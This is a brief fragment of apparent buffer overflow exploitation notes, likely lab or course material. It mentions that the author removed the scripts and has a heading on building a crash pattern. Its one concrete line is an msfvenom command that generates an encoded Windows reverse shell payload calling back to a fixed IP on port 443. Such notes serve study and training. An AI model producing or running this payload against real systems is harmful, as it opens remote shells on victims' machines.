...
**Note:** I removed the scripts, because I do not know if I can share them publicly.

## Create a pattern depending on the buffer size that crashes the application
...
```msfvenom -p windows/shell_reverse_tcp LHOST=10.11.0.167 LPORT=443 -f c –e x86/shikata_ga_nai -b "\x00\x0a\x0d"```